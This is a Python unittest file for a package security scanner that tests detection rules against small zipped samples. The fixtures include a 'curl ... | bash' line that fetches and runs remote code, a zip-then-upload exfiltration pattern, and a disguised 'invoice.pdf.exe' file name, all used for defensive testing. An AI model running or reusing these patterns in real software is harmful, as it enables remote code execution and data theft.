from __future__ import annotations

import unittest
from io import BytesIO
from zipfile import ZIP_DEFLATED, ZipFile

from skill_security import PackageInput, ScanPolicy, ScanRequest, SecurityScan, compile_rules


def compiled_rule(
    rule_id: str,
    match: dict[str, object],
    *,
    scope: str = "line",
    evidence: str = "command",
    skip_extensions: list[str] | None = None,
):
    document = {
        "schemaVersion": "1.0",
        "ruleVersion": "test",
        "sourceVersion": "test",
        "defaultSkipDirectories": [".git"],
        "textExtensions": ["md", "py", "sh", "txt"],
        "vocabularies": {"executables": [".exe", ".sh"]},
        "rules": [
            {
                "id": rule_id,
                "detector": "TestDetector",
                "name": rule_id,
                "sourceDescription": rule_id,
                "severity": "HIGH",
                "status": "APPROVED",
                "scope": scope,
                "match": match,
                "evidence": {"type": evidence, "prefixLength": 0},
                "remediation": None,
                "sourceLimitations": [],
                "skipExtensions": skip_extensions or [],
            }
        ],
    }
    return compile_rules(document)


def scan(entries: dict[str, str | bytes], rules):
    stream = BytesIO()
    with ZipFile(stream, "w", ZIP_DEFLATED) as archive:
        for path, content in entries.items():
            archive.writestr(path, content)
    policy = ScanPolicy(1024 * 1024, 20, 64 * 1024, 1024 * 1024, 100)
    return SecurityScan(policy).scan(
        ScanRequest((PackageInput("sample.zip", BytesIO(stream.getvalue())),), rules)
    )


class BehaviorDetectionTests(unittest.TestCase):
    def test_sequence_requires_terms_in_source_order(self) -> None:
        rules = compiled_rule(
            "SEC-TEST-01",
            {"type": "line_sequence", "segments": ["curl", "|", "bash"]},
        )

        positive = scan({"run.sh": "curl https://example.test | bash"}, rules)
        self.assertEqual(len(positive.findings), 1)
        self.assertEqual(scan({"run.sh": "bash first; curl later | cat"}, rules).findings, ())

    def test_package_combination_can_use_facts_from_different_files(self) -> None:
        rules = compiled_rule(
            "SEC-TEST-01",
            {
                "type": "package_groups",
                "groups": [["ZipFile", "zipfile"], ["requests.post", ".upload"]],
            },
            scope="package",
        )

        result = scan(
            {"compress.py": "ZipFile('data.zip')", "send.py": "requests.post(endpoint)"},
            rules,
        )

        self.assertEqual(len(result.findings), 1)
        self.assertEqual(result.findings[0].entry_path, "send.py")

    def test_filename_rule_scans_non_text_entry(self) -> None:
        rules = compiled_rule(
            "SEC-TEST-01",
            {"type": "filename_double_extension", "executableVocabulary": "executables"},
            scope="filename",
            evidence="filename",
        )

        result = scan({"invoice.pdf.exe": b"\x00\x01"}, rules)

        self.assertEqual(len(result.findings), 1)
        self.assertEqual(result.findings[0].entry_path, "invoice.pdf.exe")

    def test_privilege_rule_honors_document_skip(self) -> None:
        rules = compiled_rule(
            "SEC-TEST-01",
            {"type": "command_token", "terms": ["sudo"]},
            skip_extensions=[".md"],
        )

        result = scan({"guide.md": "sudo apt update", "run.sh": "sudo apt update"}, rules)

        self.assertEqual(len(result.findings), 1)
        self.assertEqual(result.findings[0].entry_path, "run.sh")

    def test_url_evidence_redacts_sensitive_query_value(self) -> None:
        rules = compiled_rule(
            "SEC-TEST-01",
            {"type": "url_keywords", "terms": ["verify"]},
            evidence="url",
        )

        finding = scan(
            {
                "sample.txt": (
                    "https://verify.example/path?access_token=secret-value&mode=test"
                    "#auth_token=fragment-secret"
                )
            },
            rules,
        ).findings[0]

        self.assertIn("access_token=%5BREDACTED%5D", finding.evidence)
        self.assertIn("auth_token=%5BREDACTED%5D", finding.evidence)
        self.assertNotIn("secret-value", finding.evidence)
        self.assertNotIn("fragment-secret", finding.evidence)


if __name__ == "__main__":
    unittest.main()
